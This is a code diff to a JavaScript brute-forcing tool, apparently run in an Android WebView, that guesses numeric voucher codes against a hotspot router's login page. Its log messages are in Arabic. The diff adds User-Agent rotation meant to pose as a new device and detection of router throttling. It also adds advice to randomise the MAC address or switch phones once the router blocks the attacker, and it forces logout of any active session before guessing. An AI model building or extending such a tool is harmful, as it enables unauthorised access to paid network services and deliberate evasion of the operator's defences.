@@ -8,6 +8,15 @@
     function log(m) { try { window.AndroidBridge.log(m); } catch(e) {} }
     const sleep = ms => new Promise(r => setTimeout(r, ms));
 
+    // 🎭 بصمات مختلفة (User-Agent) للتظاهر بجهاز جديد
+    const USER_AGENTS = [
+        "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
+    ];
+
     function updatePageInput(v) {
         try {
             var inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[name="username"], input[id*="username"]');
@@ -59,18 +68,17 @@
         return (parseInt(m[1]||0)*86400) + (parseInt(m[2]||0)*3600) + (parseInt(m[3]||0)*60) + parseInt(m[4]||0);
     }
 
-    // ⚡ دالة ذهبية: تسجيل الخروج الإجباري وإفراغ الجلسة
     async function resetSession(base, statusUrl) {
         log('🔄 فحص الجلسة الحالية...');
         const st = await safeJson(statusUrl);
         
         if (!st || !isActive(st)) {
-            log('✓ لا توجد جلسة نشطة، جاهز للتخمين.');
+            log('✓ لا توجد جلسة نشطة.');
             return true;
         }
         
-        log('⚠ توجد جلسة نشطة (الكرت: ' + (statusUser(st) || 'غير معروف') + ')');
-        log('→ جاري تسجيل الخروج لإفراغ الجلسة...');
+        log('⚠ توجد جلسة نشطة');
+        log('→ جاري تسجيل الخروج...');
         
         try { await fetch(base + '/logout?erase-cookie=yes&var=callBack', { credentials: 'include' }); } catch(e) {}
         await sleep(1000);
@@ -80,17 +88,13 @@
             window.AndroidBridge.clearCookies();
         }
         
-        log('→ انتظار 3 ثوانٍ حتى ينسى الراوتر الجلسة...');
         await sleep(3000);
-        
         const st2 = await safeJson(statusUrl);
         if (st2 && isActive(st2)) {
             log('❌ الراوتر يرفض الخروج!');
-            log('   اخرج يدوياً من صفحة الراوتر ثم أعد المحاولة.');
             return false;
         }
-        
-        log('✓ تم إفراغ الجلسة بنجاح! جاهز للتخمين.');
+        log('✓ تم إفراغ الجلسة.');
         return true;
     }
 
@@ -100,13 +104,12 @@
             const statusUrl = base + '/status?var=callBack';
             const loginUrl = base + '/login';
 
-            log('▶ بدء التخمين (نمط الخيوط المستقلة)');
+            log('▶ بدء التخمين (وضع الكشف الذكي)');
             
-            // تسجيل الخروج أولاً
             const resetOk = await resetSession(base, statusUrl);
             if (!resetOk) return;
 
-            const tried = new Set(CFG.tried || []);
+            const tried = new Set((CFG.tried || []).slice(-50000));
             log('  تم تجربة ' + tried.size + ' رقم سابقاً');
 
             let template = { username: '', password: '', dst: base + '/', popup: 'true' };
@@ -122,10 +125,24 @@
                 }
             } catch(e) { }
 
+            // قياس RTT الابتدائي
+            log('📊 قياس سرعة الشبكة...');
+            const t0 = performance.now();
+            await safeJson(statusUrl);
+            const initialRTT = performance.now() - t0;
+            log('  RTT = ' + Math.round(initialRTT) + 'ms');
+            
+            if (initialRTT > 2000) {
+                log('⚠⚠⚠ تحذير: الشبكة بطيئة جداً من البداية!');
+                log('  الراوتر قد يحظر جهازك.');
+            }
+
             const maxVal = Math.pow(10, CFG.digits) - 1;
             let done = 0;
             let since_rest = 0;
             let routerBusy = false;
+            let consecutiveHighRTT = 0;
+            let warnedThrottle = false;
             
             const MAX_CONCURRENT = CFG.threads || 4;
             const DELAY_MIN = Math.max(200, CFG.pause || 300); 
@@ -148,6 +165,9 @@
             }
 
             async function post(v) {
+                // 🎭 استخدام User-Agent مختلف لكل محاولة
+                const ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
+                
                 const body = new URLSearchParams();
                 for (const k in template) body.set(k, template[k]);
                 body.set('username', v);
@@ -156,13 +176,20 @@
                 const controller = new AbortController();
                 const timeoutId = setTimeout(() => controller.abort(), 15000);
                 
+                const reqStart = performance.now();
                 try {
                     const r = await fetch(loginUrl, {
                         method: 'POST', body: body.toString(), credentials: 'include',
-                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        headers: { 
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'User-Agent': ua,
+                            'Cache-Control': 'no-cache',
+                            'Pragma': 'no-cache'
+                        },
                         redirect: 'manual', signal: controller.signal
                     });
                     clearTimeout(timeoutId);
+                    const reqTime = performance.now() - reqStart;
                     
                     let text = '';
                     if (r.status !== 302 && r.status !== 301) text = await r.text();
@@ -183,10 +210,10 @@
                             }
                         }
                     }
-                    return { v, code: r.status, errMsg, isBusy, isBad };
+                    return { v, code: r.status, errMsg, isBusy, isBad, time: reqTime };
                 } catch(e) {
                     clearTimeout(timeoutId);
-                    return { v, code: 0, errMsg: 'Network Error', isBad: true };
+                    return { v, code: 0, errMsg: 'Network Error', isBad: true, time: performance.now() - reqStart };
                 }
             }
 
@@ -218,8 +245,28 @@
                     
                     const res = await post(v);
 
+                    // 🚨 كشف الحظر الذكي: إذا كانت الاستجابة بطيئة جداً (> 2 ثانية)
+                    if (res.time > 2000) {
+                        consecutiveHighRTT++;
+                        if (consecutiveHighRTT >= 5 && !warnedThrottle) {
+                            log('');
+                            log('🚨🚨🚨 تحذير خطير 🚨🚨🚨');
+                            log('الراوتر يبطئ استجابته عمداً (' + Math.round(res.time) + 'ms للطلب).');
+                            log('هذا يعني أن الراوتر حظر جهازك (MAC).');
+                            log('');
+                            log('الحلول المقترحة:');
+                            log('1. أغلق الواي فاي في الهاتف لمدة دقيقة');
+                            log('2. اذهب لإعدادات الواي فاي → خيارات متقدمة → اختيار MAC عشوائي');
+                            log('3. أو استخدم هاتف آخر');
+                            log('');
+                            warnedThrottle = true;
+                        }
+                    } else {
+                        consecutiveHighRTT = 0;
+                    }
+
                     if (res.isBusy) {
-                        log('🛑 الراوتر قال: ' + res.errMsg + ' → انتظار...');
+                        log('🛑 الراوتر: ' + res.errMsg + ' → انتظار...');
                         routerBusy = true;
                         setTimeout(() => { routerBusy = false; }, RETRY_DELAY);
                     } else if (res.isBad) {
@@ -252,6 +299,11 @@
             await Promise.all(workers);
             
             log('❌ انتهى — ' + done + ' محاولة');
+            
+            if (warnedThrottle) {
+                log('');
+                log('⚠ الراوتر يحظر هذا الجهاز. غيّر MAC أو استخدم هاتف آخر.');
+            }
         } catch(e) {
             log('❌ خطأ: ' + e.message);
         }
